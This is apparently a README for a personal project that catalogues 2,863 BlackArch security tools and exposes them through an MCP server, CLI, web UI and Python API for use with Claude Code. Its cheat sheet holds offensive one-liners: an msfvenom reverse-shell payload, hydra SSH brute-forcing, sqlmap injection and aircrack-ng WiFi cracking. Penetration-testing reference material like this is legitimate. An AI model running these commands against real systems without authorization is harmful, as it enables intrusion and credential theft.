# BlackArch Security Tools - Complete Package

> **2,863 security tools** organized across **48 categories** with MCP server, CLI, Web UI, and Python API.

## 📦 Files Overview

### Core Database
| File | Size | Description |
|------|------|-------------|
| `blackarch` | 316KB | Original BlackArch package list |
| `blackarch_full_db.json` | 485KB | Complete JSON database |

### MCP Server (Model Context Protocol)
| File | Size | Description |
|------|------|-------------|
| `blackarch_mcp_v2.py` | 18KB | **Main MCP server** |
| `blackarch_client.py` | 7KB | Python MCP client |
| `blackarch_mcp_config.py` | 4KB | Claude Code integration |

### CLI Tools
| File | Size | Description |
|------|------|-------------|
| `blackarch.sh` | 7KB | Bash CLI (colored output) |
| `blackarch_api.py` | 5KB | Python API library |
| `blackarch_assistant.py` | 7KB | Phase-based recommendations |
| `blackarch_manager.py` | 8KB | Tool installer/manager |

### Web Interface
| File | Size | Description |
|------|------|-------------|
| `blackarch_web.py` | 14KB | HTTP server (port 8080) |

### Documentation
| File | Size | Description |
|------|------|-------------|
| `blackarch_categorized.md` | 281KB | Full markdown reference |
| `blackarch_cheatsheet.md` | 9KB | Quick command reference |
| `README_BLACKARCH_MCP.md` | 5KB | This file |

---

## 🚀 Quick Start

### 1. CLI (Bash)
```bash
cd /run/media/phoenix0/Ventoy/New\ Folder

# Show stats
./blackarch.sh stats

# List categories
./blackarch.sh list

# Search tools
./blackarch.sh search nmap

# Show tool details
./blackarch.sh tool sqlmap

# Command cheat sheet
./blackarch.sh cheat scanner
```

### 2. MCP Server
```bash
# Start MCP server
python3 blackarch_mcp_v2.py

# In another terminal - use client
python3 blackarch_client.py categories
python3 blackarch_client.py search sqlmap
python3 blackarch_client.py tool nmap
```

### 3. Web Interface
```bash
# Start web server on port 8080
python3 blackarch_web.py
# Then open http://localhost:8080
```

### 4. Python API
```python
from blackarch_api import BlackArchAPI

api = BlackArchAPI()

# List categories
print(api.categories())

# Search tools
for tool in api.search("nmap"):
    print(f"{tool.name} - {tool.description}")

# Get stats
print(api.stats())
```

---

## 📊 Top 10 Categories

| # | Category | Tools | Use Case |
|---|----------|-------|----------|
| 1 | WEBAPP | 309 | Web application testing |
| 2 | SCANNER | 305 | Network discovery |
| 3 | RECON | 257 | Reconnaissance & OSINT |
| 4 | EXPLOITATION | 182 | Exploit development |
| 5 | CRACKER | 162 | Password attacks |
| 6 | WINDOWS | 154 | Windows security |
| 7 | FORENSIC | 154 | Digital forensics |
| 8 | NETWORKING | 146 | Traffic analysis |
| 9 | WIRELESS | 67 | WiFi auditing |
| 10 | BINARY | 64 | Reverse engineering |

---

## 🎯 MCP Protocol

### Request Format
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "get_tools",
    "arguments": {"category": "scanner", "limit": 20}
  }
}
```

### Available Tools
1. `get_categories` - List all 48 categories
2. `get_tools` - Get tools in category
3. `search` - Search by name/description
4. `get_tool` - Detailed tool info
5. `random` - Random tool selector
6. `stats` - Database statistics
7. `by_tags` - Find by keywords
8. `cheat_sheet` - Common commands

### Claude Code Integration
Add to your MCP config:
```json
{
  "mcpServers": {
    "blackarch": {
      "command": "python3",
      "args": ["/run/media/phoenix0/Ventoy/New Folder/blackarch_mcp_v2.py"]
    }
  }
}
```

---

## 🔧 Configuration

### Environment Variables
```bash
export BLACKARCH_PATH=/run/media/phoenix0/Ventoy/New\ Folder
export PATH=$PATH:/run/media/phoenix0/Ventoy/New\ Folder
```

### Aliases
```bash
# Add to ~/.bashrc
alias blackarch='/run/media/phoenix0/Ventoy/New\ Folder/blackarch.sh'
alias ba='python3 /run/media/phoenix0/Ventoy/New\ Folder/blackarch_client.py'
```

---

## 📚 Cheat Sheet

### Scanning
```bash
nmap -sV -sC target.com
masscan -p1-65535 target.com --rate=10000
rustscan -a target.com
```

### Web Security
```bash
sqlmap -u "http://target.com/?id=1" --batch
nikto -h target.com
dirb http://target.com
```

### Exploitation
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP -f elf > shell.elf
searchsploit keyword
```

### Password Attacks
```bash
hashcat -m 0 -a 0 hash.txt wordlist.txt
hydra -l admin -P passwords.txt ssh://target.com
```

### Wireless
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aircrack-ng capture.cap -w wordlist.txt
```

---

## 📁 Directory Structure

```
/run/media/phoenix0/Ventoy/New Folder/
├── blackarch                    # Original data
├── blackarch_full_db.json       # JSON database
├── blackarch_categorized.md     # Markdown reference
├── blackarch_cheatsheet.md      # Quick reference
│
├── blackarch_mcp_v2.py          # MCP Server (main)
├── blackarch_client.py          # Python client
├── blackarch_mcp_config.py      # Config generator
│
├── blackarch.sh                 # Bash CLI
├── blackarch_api.py             # Python API
├── blackarch_assistant.py       # Phase recommendations
├── blackarch_manager.py         # Tool installer
├── blackarch_web.py             # Web interface
│
└── README_BLACKARCH_MCP.md      # This file
```

---

## ✅ Verification

```bash
# Test CLI
./blackarch.sh stats

# Test MCP server
echo '{"jsonrpc":"2.0","id":1,"method":"tools/list"}' | python3 blackarch_mcp_v2.py

# Test Python API
python3 -c "from blackarch_api import BlackArchAPI; api = BlackArchAPI(); print(api.stats())"
```

---

**Total:** 2,863 tools | 48 categories | 12 files

*Generated: 2025-05-10*